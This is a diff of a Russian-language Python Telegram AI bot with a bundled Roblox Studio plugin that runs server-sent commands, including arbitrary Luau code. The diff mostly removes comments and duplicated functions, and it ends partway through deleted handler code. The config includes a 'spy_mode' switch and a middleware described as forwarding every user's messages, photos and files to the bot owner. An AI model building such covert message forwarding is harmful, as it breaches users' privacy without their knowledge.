@@ -35,7 +35,6 @@ except ImportError:
 
 
 def clean_env(key: str, default: str) -> str:
-    """Читает переменную окружения и очищает от случайных пробелов и кавычек."""
     val = os.getenv(key, default)
     return val.strip().strip('"').strip("'")
 
@@ -58,12 +57,11 @@ MCP_PUBLIC_URL = clean_env("MCP_PUBLIC_URL", f"http://127.0.0.1:{MCP_PORT}").rst
 
 DATA_FILE = "bot_data.json"
 
-# Динамические настройки (сохраняются в БД)
 bot_config = {
     "free_limit": int(clean_env("FREE_LIMIT", "45000")),
     "sub_limit": int(clean_env("SUB_LIMIT", "1000000")),
     "photo_model": PHOTO_MODEL,
-    "spy_mode": False,  # Переключатель прослушки сообщений для владельца
+    "spy_mode": False,
     "mcp_public_url": MCP_PUBLIC_URL
 }
 
@@ -81,7 +79,6 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
 
-# --- УМНАЯ РАБОТА С URL (С /v1 И БЕЗ /v1) ---
 def get_url_variants(raw_url: str) -> list[str]:
     clean = raw_url.strip().rstrip("/")
     if clean.endswith("/v1"):
@@ -98,7 +95,6 @@ ai_clients = [AsyncOpenAI(api_key=AI_API_KEY, base_url=u, timeout=120.0) for u i
 photo_clients = [AsyncOpenAI(api_key=PHOTO_GENERATIONAL_KEY, base_url=u, timeout=120.0) for u in PHOTO_URL_VARIANTS]
 
 
-# --- БАЗА МОДЕЛЕЙ ---
 DEFAULT_MODEL = "gpt-6-luna"
 
 models_db = {
@@ -122,7 +118,7 @@ models_db = {
 }
 
 users_db = {}
-reviews_db = []  # Список всех отзывов и оценок ?/10
+reviews_db = []
 user_image_cache = {}
 user_last_img_prompt = {}
 anti_spam = {}
@@ -131,10 +127,10 @@ admin_state = {}
 
 # --- ХРАНИЛИЩЕ СЕССИЙ И ЗАДАЧ ROBLOX MCP ---
 rbx_token_to_uid: dict[str, int] = {}
-rbx_sessions: dict[str, dict] = {}               # token -> {"last_seen": float, "place_name": str}
-rbx_pending_tasks: dict[str, list[dict]] = {}    # token -> [{"id": str, "tool": str, "args": dict}]
-rbx_task_events: dict[str, asyncio.Event] = {}   # token -> Event (для мгновенного Long-Polling)
-rbx_task_futures: dict[str, asyncio.Future] = {} # task_id -> Future
+rbx_sessions: dict[str, dict] = {}
+rbx_pending_tasks: dict[str, list[dict]] = {}
+rbx_task_events: dict[str, asyncio.Event] = {}
+rbx_task_futures: dict[str, asyncio.Future] = {}
 
 
 def generate_rbx_token(uid: int) -> str:
@@ -148,7 +144,6 @@ def rebuild_rbx_token_index():
             rbx_token_to_uid[u["roblox"]["token"]] = uid
 
 
-# --- СОХРАНЕНИЕ И ЗАГРУЗКА БАЗЫ ДАННЫХ (JSON) ---
 def save_data():
     try:
         serializable_users = {}
@@ -196,10 +191,7 @@ def load_data():
                 u["sub_end"] = datetime.fromisoformat(u["sub_end"]) if u.get("sub_end") else None
                 u["reset_date"] = datetime.fromisoformat(u["reset_date"]) if u.get("reset_date") else (datetime.now() + timedelta(days=30))
                 if "roblox" not in u:
-                    u["roblox"] = {
-                        "active": False,
-                        "token": generate_rbx_token(uid)
-                    }
+                    u["roblox"] = {"active": False, "token": generate_rbx_token(uid)}
                 users_db[uid] = u
         rebuild_rbx_token_index()
     except Exception as e:
@@ -207,20 +199,17 @@ def load_data():
 
 
 # =========================================================================
-# --- КОД ПЛАГИНА ROBLOX STUDIO (ШАБЛОН LUAU) ---
+# --- КОД ПЛАГИНА ROBLOX STUDIO (ШАБЛОН LUAU ДЛЯ .rbxm) ---
 # =========================================================================
 ROBLOX_PLUGIN_LUA_TEMPLATE = r'''--[[
-    🤖 ШколоAI — Roblox Studio MCP Plugin
-    Позволяет ИИ из Telegram-бота управлять вашим плейсом, создавать объекты и писать скрипты.
-    Поддерживает отмену действий через Ctrl + Z (ChangeHistoryService).
+    ШколоAI — Roblox Studio MCP Plugin (.rbxm)
+    Управляет плейсом по запросам из Telegram-бота и поддерживает отмену через Ctrl + Z.
 ]]
 
 local HttpService = game:GetService("HttpService")
 local ChangeHistoryService = game:GetService("ChangeHistoryService")
 local Selection = game:GetService("Selection")
-local RunService = game:GetService("RunService")
 
--- Преднастроенные данные вашего аккаунта из Telegram-бота:
 local DEFAULT_SERVER_URL = "__SERVER_URL__"
 local DEFAULT_TOKEN = "__USER_TOKEN__"
 
@@ -244,7 +233,6 @@ local widgetInfo = DockWidgetPluginGuiInfo.new(
 local widget = plugin:CreateDockWidgetPluginGui("ShkoloAI_MCP_Widget_v1", widgetInfo)
 widget.Title = "🤖 ШколоAI — Roblox MCP"
 
--- UI Оформление
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
@@ -355,9 +343,6 @@ toggleBtn.Click:Connect(function()
     widget.Enabled = not widget.Enabled
 end)
 
--- =========================================================================
--- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ROBLOX MCP
--- =========================================================================
 local function resolveInstance(pathStr)
     if not pathStr or pathStr == "" or pathStr == "game" then
         return game
@@ -454,9 +439,6 @@ local function serializeTree(inst, depth, maxDepth)
     return node
 end
 
--- =========================================================================
--- ОБРАБОТЧИКИ ИНСТРУМЕНТОВ MCP
--- =========================================================================
 local tools = {}
 
 tools.get_explorer_tree = function(args)
@@ -607,9 +589,6 @@ tools.run_luau_code = function(args)
     return output
 end
 
--- =========================================================================
--- ЦИКЛ ОПРОСА MCP СЕРВЕРА
--- =========================================================================
 local isConnected = false
 local loopId = 0
 
@@ -735,6 +714,31 @@ addLog("👋 Плагин ШколоAI готов! Нажмите «Подклю
 '''
 
 
+def build_rbxm_plugin_bytes(server_url: str, user_token: str) -> bytes:
+    lua_code = (
+        ROBLOX_PLUGIN_LUA_TEMPLATE
+        .replace("__SERVER_URL__", server_url)
+        .replace("__USER_TOKEN__", user_token)
+    )
+    safe_cdata_code = lua_code.replace("]]>", "]]]]><![CDATA[>")
+
+    rbxm_xml = f'''<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
+\t<External>null</External>
+\t<External>nil</External>
+\t<Item class="Script" referent="RBX0">
+\t\t<Properties>
+\t\t\t<bool name="Disabled">false</bool>
+\t\t\t<Content name="LinkedSource"><null></null></Content>
+\t\t\t<string name="Name">ShkoloAI_MCP_Plugin</string>
+\t\t\t<token name="RunContext">0</token>
+\t\t\t<string name="ScriptGuid">{{{str(uuid.uuid4()).upper()}}}</string>
+\t\t\t<ProtectedString name="Source"><![CDATA[{safe_cdata_code}]]></ProtectedString>
+\t\t</Properties>
+\t</Item>
+</roblox>'''
+    return rbxm_xml.encode("utf-8")
+
+
 # =========================================================================
 # --- ФУНКЦИИ ROBLOX MCP СЕРВЕРА (AIOHTTP) И ВЫЗОВА ИНСТРУМЕНТОВ ---
 # =========================================================================
@@ -813,7 +817,6 @@ async def handle_mcp_poll(request: web.Request) -> web.Response:
     if token not in rbx_task_events:
         rbx_task_events[token] = asyncio.Event()
 
-    # Если задач пока нет, ждем до 8 секунд (Long-Polling), чтобы команды срабатывали мгновенно
     if not rbx_pending_tasks.get(token):
         evt = rbx_task_events[token]
         evt.clear()
@@ -913,11 +916,6 @@ def extract_mcp_calls(text: str) -> list[dict]:
 # --- MIDDLEWARE ПРОСЛУШКИ СООБЩЕНИЙ ДЛЯ ВЛАДЕЛЬЦА ---
 # =========================================================================
 class SpyMessagesMiddleware(BaseMiddleware):
-    """
-    Если у владельца включен режим прослушки (bot_config['spy_mode'] == True),
-    пересылает владельцу все входящие сообщения, фото и файлы пользователей.
-    При выключении — мгновенно перестает пересылать.
-    """
     async def __call__(
         self,
         handler: Callable[[TelegramObject, Dict[str, Any]], Awaitable[Any]],
@@ -1007,7 +1005,6 @@ async def create_chat_completion(**kwargs):
 
 
 # --- РАСПОЗНАВАНИЕ ИЗОБРАЖЕНИЙ (VISION) ---
-# --- РАСПОЗНАВАНИЕ ИЗОБРАЖЕНИЙ (VISION) ---
 VISION_REFUSAL_MARKERS = (
     "не могу просматривать", "не вижу изображен", "не могу увидеть",
     "cannot see the image", "can't view images", "unable to view",
@@ -1018,7 +1015,6 @@ VISION_REFUSAL_MARKERS = (
 
 def get_vision_fallback_models(preferred_model: str) -> list[str]:
     candidates = []
-    # Сначала всегда пробуем ту модель, которая выбрана у пользователя
     if preferred_model:
         candidates.append(preferred_model)
 
@@ -1051,10 +1047,9 @@ async def create_vision_completion(
         else "Внимательно изучи это изображение. Если на нем задание, тест, код или задача — подробно реши его. Если текст — разбери и ответь. Если просто картинка — подробно опиши."
     )
 
-    # Передаем краткий контекст текстом внутри самого запроса, чтобы не ломать мультимодальный массив messages
     context_str = ""
     if history:
-        recent_ text_lines = []
+        recent_text_lines = []
         for h in history[-4:]:
             role_label = "Пользователь" if h.get("role") == "user" else "Ассистент"
             content_val = h.get("content", "")
@@ -1067,9 +1062,7 @@ async def create_vision_completion(
     vision_models = get_vision_fallback_models(preferred_model)
     last_err = None
 
-    # Формируем 3 варианта payload для максимальной совместимости с любыми прокси OpenAI/Gemini/Claude
     payload_variants = [
-        # Вариант 1: Стандартный OpenAI Vision (system + user с detail: auto)
         [
             {"role": "system", "content": sys_prompt},
             {
@@ -1080,7 +1073,6 @@ async def create_vision_completion(
                 ]
             }
         ],
-        # Вариант 2: Одиночное сообщение user (лучше всего работает для Gemini / Claude через прокси)
         [
             {
                 "role": "user",
@@ -1090,7 +1082,6 @@ async def create_vision_completion(
                 ]
             }
         ],
-        # Вариант 3: Упрощенный формат, где image_url передается строкой
         [
             {
                 "role": "user",
@@ -1118,7 +1109,6 @@ async def create_vision_completion(
                 except Exception as e:
                     last_err = e
 
-    # Прямой HTTP-запрос через aiohttp на случай, если SDK OpenAI модифицирует заголовки
     headers = {
         "Authorization": f"Bearer {AI_API_KEY}",
         "Content-Type": "application/json"
@@ -1141,97 +1131,6 @@ async def create_vision_completion(
                         ans = (data.get("choices", [{}])[0].get("message", {}).get("content") or "").strip()
                         if ans and not any(marker in ans.lower() for marker in VISION_REFUSAL_MARKERS):
                             return ans
-            except Exception as e:
-                last_err = e
-
-    if last_err:
-        raise last_err
-    return "⚠️ Не удалось распознать изображение. Попробуйте выбрать другую модель с иконкой 🖼."
-
-
-def get_vision_fallback_models(preferred_model: str) -> list[str]:
-    candidates = []
-    if models_db.get(preferred_model, {}).get("vision"):
-        candidates.append(preferred_model)
-
-    priority_vision = [
-        "gemini-3.8-flash", "gemini-3.6-flash", "gpt-6-luna",
-        "gpt-6-so", "sonnet-5", "gpt-6.1-sol", "gemini-4-argon"
-    ]
-    for m in priority_vision:
-        if m in models_db and m not in candidates:
-            candidates.append(m)
-
-    for m, info in models_db.items():
-        if info.get("vision") and m not in candidates:
-            candidates.append(m)
-
-    return candidates or [DEFAULT_MODEL]
-
-
-async def create_vision_completion(
-    preferred_model: str,
-    sys_prompt: str,
-    history: list[dict],
-    user_text: str,
-    b64_image: str
-) -> str:
-    prompt_text = (
-        user_text.strip()
-        if user_text and user_text.strip()
-        else "Внимательно изучи это изображение. Если на нем задание, тест, код или задача — подробно реши его. Если текст — разбери и ответь. Если просто картинка — подробно опиши."
-    )
-
-    vision_models = get_vision_fallback_models(preferred_model)
-    last_err = None
-    short_history = history[-4:] if history else []
-
-    for mod in vision_models:
-        messages_payload = [{"role": "system", "content": sys_prompt}]
-        for h in short_history:
-            if isinstance(h.get("content"), str):
-                messages_payload.append(h)
-
-        messages_payload.append({
-            "role": "user",
-            "content": [
-                {"type": "text", "text": prompt_text},
-                {"type": "image_url", "image_url": {"url": b64_image}}
-            ]
-        })
-
-        for client in ai_clients:
-            try:
-                resp = await client.chat.completions.create(
-                    model=mod,
-                    messages=messages_payload,
-                    stream=False
-                )
-                ans = (resp.choices[0].message.content or "").strip()
-                if ans and not any(marker in ans.lower() for marker in VISION_REFUSAL_MARKERS):
-                    return ans
-            except Exception as e:
-                last_err = e
-
-        simple_messages = [
-            {
-                "role": "user",
-                "content": [
-                    {"type": "text", "text": f"{sys_prompt}\n\nЗапрос пользователя: {prompt_text}"},
-                    {"type": "image_url", "image_url": {"url": b64_image}}
-                ]
-            }
-        ]
-        for client in ai_clients:
-            try:
-                resp = await client.chat.completions.create(
-                    model=mod,
-                    messages=simple_messages,
-                    stream=False
-                )
-                ans = (resp.choices[0].message.content or "").strip()
-                if ans and not any(marker in ans.lower() for marker in VISION_REFUSAL_MARKERS):
-                    return ans
             except Exception as e:
                 last_err = e
 
@@ -1266,26 +1165,6 @@ def decode_b64_image_str(b64_str: str) -> bytes:
     return base64.b64decode(b64_str.strip())
 
 
-async def extract_image_from_api_dict(data: dict) -> tuple[bytes | str | None, bool]:
-    if not isinstance(data, dict):
-        return None, False
-
-    if "data" in data and isinstance(data["data"], list) and len(data["data"]) > 0:
-        first = data["data"][0]
-        if isinstance(first, dict):
-            if first.get("b64_json"):
-                return decode_b64_image_str(first["b64_json"]), True
-            if first.get("url"):
-                u = first["url"]
-                if u.startswith("data:image"):
-                    return decode_b64_image_str(u), True
-                img_bytes = await download_image_bytes(u)
-                if img_bytes:
-                    return img_bytes, True
-                return u, False
-
-    for key in ("b64_json", "image_base64", "base64"):
-        if data.get(key) and isinstance(data[key],
 async def extract_image_from_api_dict(data: dict) -> tuple[bytes | str | None, bool]:
     if not isinstance(data, dict):
         return None, False
@@ -1427,39 +1306,6 @@ async def generate_image_api(prompt: str) -> tuple[bytes | str, bool]:
                     last_err = e
 
     raise last_err or Exception("Не удалось сгенерировать изображение через PHOTO_BASE_URL.")
-
-
-# =========================================================================
-# --- УПАКОВЩИК ПЛАГИНА В ФОРМАТ ROBLOX (.rbxm) ---
-# =========================================================================
-def build_rbxm_plugin_bytes(server_url: str, user_token: str) -> bytes:
-    """
-    Генерирует полноценный файл модели/плагина Roblox (.rbxm),
-    содержащий Script с кодом MCP-клиента и вшитым токеном игрока.
-    """
-    lua_code = (
-        ROBLOX_PLUGIN_LUA_TEMPLATE
-        .replace("__SERVER_URL__", server_url)
-        .replace("__USER_TOKEN__", user_token)
-    )
-    # Защита на случай если в коде встретится закрывающий тег CDATA
-    safe_cdata_code = lua_code.replace("]]>", "]]]]><![CDATA[>")
-
-    rbxm_xml = f'''<roblox xmlns:xmime="http://www.w3.org/2005/05/xmlmime" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://www.roblox.com/roblox.xsd" version="4">
-\t<External>null</External>
-\t<External>nil</External>
-\t<Item class="Script" referent="RBX0">
-\t\t<Properties>
-\t\t\t<bool name="Disabled">false</bool>
-\t\t\t<Content name="LinkedSource"><null></null></Content>
-\t\t\t<string name="Name">ShkoloAI_MCP_Plugin</string>
-\t\t\t<token name="RunContext">0</token>
-\t\t\t<string name="ScriptGuid">{{{str(uuid.uuid4()).upper()}}}</string>
-\t\t\t<ProtectedString name="Source"><![CDATA[{safe_cdata_code}]]></ProtectedString>
-\t\t</Properties>
-\t</Item>
-</roblox>'''
-    return rbxm_xml.encode("utf-8")
 
 
 # --- УПРАВЛЕНИЕ ЮЗЕРАМИ ---
@@ -2285,7 +2131,6 @@ async def file_id_to_base64(file_id: str) -> str:
 
 async def extract_message_image_b64(message: Message) -> str | None:
     if message.photo:
-        # Выбираем размер фото ~800-1000px (до 350 КБ), чтобы прокси-API не сбрасывал запрос по лимиту размера JSON
         chosen = message.photo[-1]
         for p in reversed(message.photo):
             if not p.file_size or p.file_size <= 380_000:
@@ -2295,22 +2140,6 @@ async def extract_message_image_b64(message: Message) -> str | None:
 
     if is_image_document(message):
         if message.document.file_size and message.document.file_size <= 4 * 1024 * 1024:
-            return await file_id_to_base64(message.document.file_id)
-
-    return None
-
-
-async def extract_message_image_b64(message: Message) -> str | None:
-    if message.photo:
-        chosen = message.photo[-1]
-        for p in reversed(message.photo):
-            if not p.file_size or p.file_size <= 1_200_000:
-                chosen = p
-                break
-        return await file_id_to_base64(chosen.file_id)
-
-    if is_image_document(message):
-        if message.document.file_size and message.document.file_size <= 5 * 1024 * 1024:
             return await file_id_to_base64(message.document.file_id)
 
     return None
@@ -2918,622 +2747,4 @@ async def cb_adm_broadcast(callback: CallbackQuery):
     if callback.from_user.id != ADMIN_ID:
         return
     admin_state[ADMIN_ID] = {"action": "broadcast"}
-    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="adm_back_main")]])
-    await callback.message.edit_text("📢 Введите текст рассылки, который получат все пользователи бота:", reply_markup=kb, parse_mode="HTML")
-
-
-@dp.message(Command("give_sub"))
-async def cmd_give_sub(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    try:
-        _, tid, days = message.text.split()
-        tid, days = int(tid), int(days)
-        u = get_user(tid)
-        u["is_sub"] = True
-        u["sub_end"] = datetime.now() + timedelta(days=days)
-        save_data()
-        await message.answer(f"✅ Выдано <code>{tid}</code> на {days} дней.", parse_mode="HTML")
-        try:
-            await bot.send_message(tid, f"🎉 Вам выдана подписка Premium на {days} дней!")
-        except Exception:
-            pass
-    except Exception:
-        await message.answer("Формат: <code>/give_sub ID 30</code>", parse_mode="HTML")
-
-
-@dp.message(Command("ban"))
-async def cmd_ban_user(message: Message):
-    if message.from_user.id != ADMIN_ID:
-        return
-    try:
-        tid = int(message.text.split()[1])
-        u = get_user(tid)
-        u["banned"] = not u["banned"]
-        save_data()
-        await message.answer(f"✅ Статус бана <code>{tid}</code> изменен.", parse_mode="HTML")
-    except Exception:
-        await message.answer("Формат: <code>/ban ID</code>", parse_mode="HTML")
-
-
-@dp.callback_query(F.data.startswith("adm_ban_") | F.data.startswith("adm_sub_") | F.data.startswith("adm_reply_"))
-async def cb_admin_quick_actions(callback: CallbackQuery):
-    if callback.from_user.id != ADMIN_ID:
-        return
-    data = callback.data
-    if data.startswith("adm_ban_"):
-        tid = int(data.replace("adm_ban_", ""))
-        u = get_user(tid)
-        u["banned"] = True
-        save_data()
-        await callback.answer("Пользователь забанен!")
-    elif data.startswith("adm_sub_"):
-        tid = int(data.replace("adm_sub_", ""))
-        u = get_user(tid)
-        u["is_sub"] = True
-        u["sub_end"] = datetime.now() + timedelta(days=30)
-        save_data()
-        await callback.answer("Подписка выдана!")
-        try:
-            await bot.send_message(tid, "🎉 Вам выдана подписка Premium на 30 дней!")
-        except Exception:
-            pass
-    elif data.startswith("adm_reply_"):
-        tid = int(data.replace("adm_reply_", ""))
-        admin_reply_target[ADMIN_ID] = tid
-        await callback.message.answer(f"✍️ Напишите ответ для <code>{tid}</code>:", parse_mode="HTML")
-        await callback.answer()
-
-
-# --- РЕЖИМ ШКОЛЫ ---
-@dp.message(F.text.startswith("🎓"))
-async def menu_school(message: Message):
-    u = get_user(message.from_user.id)
-    await message.answer(
-        "🎓 <b>Режим Школа</b>",
-        reply_markup=get_school_main_kb(u),
-        parse_mode="HTML"
-    )
-
-
-@dp.callback_query(F.data.startswith("sch_menu_"))
-async def cb_school_menus(callback: CallbackQuery):
-    action = callback.data.replace("sch_menu_", "")
-    buttons = []
-
-    if action == "grade":
-        row = []
-        for i in range(1, 12):
-            row.append(InlineKeyboardButton(text=f"{i} кл", callback_data=f"sch_set_grade_{i} класс"))
-            if len(row) == 4:
-                buttons.append(row)
-                row = []
-        if row:
-            buttons.append(row)
-    elif action == "quarter":
-        for i in range(1, 5):
-            buttons.append([InlineKeyboardButton(text=f"{i} четверть", callback_data=f"sch_set_quarter_{i} четверть")])
-    elif action == "level":
-        levels = ["Начальный (просто)", "Средний", "Продвинутый (Олимпиада)"]
-        for l in levels:
-            buttons.append([InlineKeyboardButton(text=l, callback_data=f"sch_set_level_{l}")])
-    elif action == "hw":
-        hws = ["Письменное", "Проект", "Творческое", "Пересказ"]
-        for h in hws:
-            buttons.append([InlineKeyboardButton(text=h, callback_data=f"sch_set_hw_{h}")])
-
-    buttons.append([InlineKeyboardButton(text="🔙 Назад", callback_data="sch_back_main")])
-    await callback.message.edit_reply_markup(reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
-
-
-@dp.callback_query(F.data.startswith("sch_set_"))
-async def cb_school_set(callback: CallbackQuery):
-    u = get_user(callback.from_user.id)
-    param, val = callback.data.replace("sch_set_", "").split("_", 1)
-    if param == "hw":
-        u["school"]["hw_type"] = val
-    elif param in ["grade", "quarter", "level"]:
-        u["school"][param] = val
-    save_data()
-    await callback.message.edit_reply_markup(reply_markup=get_school_main_kb(u))
-
-
-@dp.callback_query(F.data == "sch_back_main")
-async def cb_school_back(callback: CallbackQuery):
-    u = get_user(callback.from_user.id)
-    await callback.message.edit_reply_markup(reply_markup=get_school_main_kb(u))
-
-
-@dp.callback_query(F.data.startswith("sch_"))
-async def cb_school_others(callback: CallbackQuery):
-    u = get_user(callback.from_user.id)
-    if callback.data == "sch_toggle":
-        u["school"]["active"] = not u["school"]["active"]
-    elif callback.data == "sch_topic":
-        u["state"] = "school_topic"
-        return await callback.message.answer("📌 Введите название темы:")
-    elif callback.data == "sch_train_toggle":
-        u["school"]["training_mode"] = not u["school"]["training_mode"]
-    elif callback.data == "sch_train_clear":
-        u["school"]["training_samples"].clear()
-
-    save_data()
-    await callback.message.edit_reply_markup(reply_markup=get_school_main_kb(u))
-
-
-# --- ПЕРЕКЛЮЧАТЕЛЬ ПОИСКА ---
-@dp.message(F.text.startswith("🌐 Поиск:"))
-async def toggle_web(message: Message):
-    u = get_user(message.from_user.id)
-    u["web_search"] = not u["web_search"]
-    save_data()
-    status_text = "🟢 ВКЛ" if u["web_search"] else "🔴 ВЫКЛ"
-    await message.answer(f"🌐 Поиск в интернете: <b>{status_text}</b>", reply_markup=get_main_kb(message.from_user.id), parse_mode="HTML")
-
-
-# =========================================================================
-# --- ГЛАВНЫЙ ОБРАБОТЧИК СООБЩЕНИЙ, ФОТО И ФАЙЛОВ ---
-# =========================================================================
-@dp.message(F.text | F.photo | F.document)
-async def handle_requests(message: Message):
-    uid = message.from_user.id
-    u = get_user(uid)
-
-    if u["banned"]:
-        return
-
-    # 1. Обработка состояний Админ-панели
-    if uid == ADMIN_ID and ADMIN_ID in admin_state and message.text:
-        st = admin_state.pop(ADMIN_ID)
-        act = st.get("action")
-
-        if act == "adm_edit_free_lim":
-            if message.text.isdigit():
-                bot_config["free_limit"] = int(message.text)
-                save_data()
-                return await message.answer(f"✅ Бесплатный лимит изменен на <code>{bot_config['free_limit']}</code>", reply_markup=get_admin_main_kb(), parse_mode="HTML")
-            return await message.answer("❌ Введите число.")
-
-        elif act == "adm_edit_sub_lim":
-            if message.text.isdigit():
-                bot_config["sub_limit"] = int(message.text)
-                save_data()
-                return await message.answer(f"✅ Лимит подписки изменен на <code>{bot_config['sub_limit']}</code>", reply_markup=get_admin_main_kb(), parse_mode="HTML")
-            return await message.answer("❌ Введите число.")
-
-        elif act == "find_user":
-            if message.text.strip().isdigit():
-                target_id = int(message.text.strip())
-                text, kb = render_user_manage_card(target_id)
-                return await message.answer(text, reply_markup=kb, parse_mode="HTML")
-            return await message.answer("❌ ID должен состоять из цифр.")
-
-        elif act == "add_model":
-            try:
-                parts = [p.strip() for p in message.text.split("|")]
-                m_id, m_name, is_prem, is_vis = parts[0], parts[1], parts[2] == "1", parts[3] == "1"
-                models_db[m_id] = {"name": m_name, "premium": is_prem, "vision": is_vis}
-                save_data()
-                return await message.answer(f"✅ Модель <b>{m_name}</b> (<code>{m_id}</code>) успешно добавлена!", reply_markup=get_admin_main_kb(), parse_mode="HTML")
-            except Exception:
-                return await message.answer("❌ Ошибка формата. Пример:\n<code>gpt-5 | GPT-5 | 1 | 1</code>", parse_mode="HTML")
-
-        elif act == "set_photo_model":
-            bot_config["photo_model"] = message.text.strip()
-            save_data()
-            return await message.answer(f"✅ Модель для генерации фото изменена на: <code>{bot_config['photo_model']}</code>", reply_markup=get_admin_main_kb(), parse_mode="HTML")
-
-        elif act == "set_mcp_url":
-            bot_config["mcp_public_url"] = message.text.strip().rstrip("/")
-            save_data()
-            return await message.answer(f"✅ Публичный URL Roblox MCP изменен на: <code>{bot_config['mcp_public_url']}</code>", reply_markup=get_admin_main_kb(), parse_mode="HTML")
-
-        elif act == "broadcast":
-            sent = 0
-            for target_uid in list(users_db.keys()):
-                try:
-                    await bot.send_message(target_uid, f"📢 <b>Объявление:</b>\n\n{message.text}", parse_mode="HTML")
-                    sent += 1
-                    await asyncio.sleep(0.05)
-                except Exception:
-                    pass
-            return await message.answer(f"✅ Рассылка завершена! Доставлено: {sent} юзерам.", reply_markup=get_admin_main_kb())
-
-    # 2. Ответ админа конкретному юзеру
-    if uid == ADMIN_ID and ADMIN_ID in admin_reply_target and message.text:
-        target_id = admin_reply_target.pop(ADMIN_ID)
-        try:
-            await bot.send_message(target_id, f"👨‍💻 <b>Сообщение от администратора:</b>\n\n{html.escape(message.text)}", parse_mode="HTML")
-            return await message.answer("✅ Ответ доставлен.")
-        except Exception as e:
-            return await message.answer(f"❌ Ошибка отправки: {e}")
-
-    # 3. Сохранение текстового отзыва и оценки ?/10
-    if u["state"] == "wait_review_text" and message.text:
-        u["state"] = None
-        score = u.get("temp_score", 10)
-        reviews_db.append({
-            "user_id": uid,
-            "name": message.from_user.full_name or "Пользователь",
-            "username": f"@{message.from_user.username}" if message.from_user.username else "без username",
-            "score": score,
-            "text": message.text.strip()[:600],
-            "date": datetime.now().strftime("%d.%m.%Y %H:%M")
-        })
-        save_data()
-        return await message.answer(
-            f"🎉 <b>Спасибо за ваш отзыв и оценку {score}/10!</b>\nОни успешно сохранены.",
-            reply_markup=get_main_kb(uid),
-            parse_mode="HTML"
-        )
-
-    # 4. Чат поддержки
-    if u["state"] == "support_chat" and message.text:
-        u["state"] = None
-        kb = InlineKeyboardMarkup(inline_keyboard=[
-            [
-                InlineKeyboardButton(text="✍️ Ответить", callback_data=f"adm_reply_{uid}"),
-                InlineKeyboardButton(text="💎 Выдать Sub (30д)", callback_data=f"adm_sub_{uid}")
-            ],
-            [InlineKeyboardButton(text="🚫 Бан", callback_data=f"adm_ban_{uid}")]
-        ])
-        await bot.send_message(ADMIN_ID, f"📩 <b>Обращение от <code>{uid}</code></b>:\n\n{html.escape(message.text)}", reply_markup=kb, parse_mode="HTML")
-        return await message.answer("✅ Сообщение отправлено администратору!", reply_markup=get_main_kb(uid))
-
-    # 5. Генерация фото
-    if u["state"] == "wait_image_prompt" and message.text:
-        u["state"] = None
-        if not u["is_sub"] and uid != ADMIN_ID:
-            return await message.answer("🔒 Генерация изображений доступна только с подпиской Premium!")
-        return await run_image_generation(message, uid, message.text)
-
-    # 6. Свой промпт
-    if u["state"] == "wait_prompt" and message.text:
-        if not check_censorship_fast(message.text):
-            return await message.answer("❌ Промпт содержит запрещенные слова.")
-        u["custom_prompt"] = message.text[:400]
-        u["state"] = None
-        save_data()
-        return await message.answer("✅ Промпт сохранен!")
-
-    # 7. Тема школы
-    if u["state"] == "school_topic" and message.text:
-        u["school"]["topic"] = message.text[:50]
-        u["state"] = None
-        save_data()
-        return await message.answer(f"✅ Тема Школы: {u['school']['topic']}", reply_markup=get_school_main_kb(u))
-
-    # Анти-спам
-    now = datetime.now()
-    if uid in anti_spam and (now - anti_spam[uid]).total_seconds() < 2.0:
-        return await message.answer("⏳ Пожалуйста, не спамьте. Подождите пару секунд.")
-    anti_spam[uid] = now
-
-    # Проверка лимитов токенов
-    limit = bot_config["sub_limit"] if u["is_sub"] else bot_config["free_limit"]
-    if u["tokens"] >= limit and uid != ADMIN_ID:
-        return await message.answer("❌ Лимит токенов исчерпан. Оформите подписку Premium для продолжения.")
-
-    # Определяем, прислано ли изображение
-    image_b64 = await extract_message_image_b64(message)
-    if image_b64:
-        user_image_cache[uid] = {"b64": image_b64, "time": now}
-
-    raw_text = (message.text or message.caption or "").strip()
-
-    if message.document and not is_image_document(message):
-        doc_content = await extract_document_text(message)
-        raw_text += f"\n\n[Содержимое файла {message.document.file_name}]:\n{doc_content[:6000]}"
-
-    # Поддержка уточняющих вопросов по недавно отправленному фото
-    if not image_b64 and uid in user_image_cache:
-        cached = user_image_cache[uid]
-        if (now - cached["time"]).total_seconds() < 600 and re.search(r"\b(на фото|с фото|на картинке|на скрине|в этом задании|номер \d|пункт \d|задач[ауи] \d)\b", raw_text.lower()):
-            image_b64 = cached["b64"]
-
-    # Режим обучения в Школе
-    s = u["school"]
-    if s["active"] and s["hw_type"] == "Письменное" and s["training_mode"]:
-        if image_b64:
-            wait_train = await message.answer("🖼 <b>Анализирую пример решения с фото...</b>", parse_mode="HTML")
-            try:
-                ans = await create_vision_completion(
-                    preferred_model=u["current_model"],
-                    sys_prompt="Ты учитель. Внимательно перепиши условие, алгоритм и стиль оформления решения с этого фото.",
-                    history=[],
-                    user_text="Разбери пошагово алгоритм и оформление решения с этого фото.",
-                    b64_image=image_b64
-                )
-                s["training_samples"].append(f"[Пример с фото]: {ans}")
-                u["tokens"] += 300
-                save_data()
-                await wait_train.delete()
-            except Exception as e:
-                return await wait_train.edit_text(f"❌ Ошибка распознавания: {e}")
-        else:
-            s["training_samples"].append(f"[Пример текста]: {raw_text}")
-            save_data()
-
-        return await message.answer(
-            f"🧠 Пример #{len(s['training_samples'])} сохранен! Отключите Режим Обучения, когда будете готовы решать ДЗ.",
-            reply_markup=get_school_main_kb(u)
-        )
-
-    # Быстрая цензура
-    if not check_censorship_fast(raw_text):
-        u["strikes"] += 1
-        save_data()
-        return await message.answer("🚫 Запрос нарушает правила безопасности.")
-
-    # Кубик Школы
-    dice_style = ""
-    if s["active"] and s["hw_type"] in ["Проект", "Творческое", "Пересказ"]:
-        dm = await message.answer_dice("🎲")
-        await asyncio.sleep(2.0)
-        styles = {
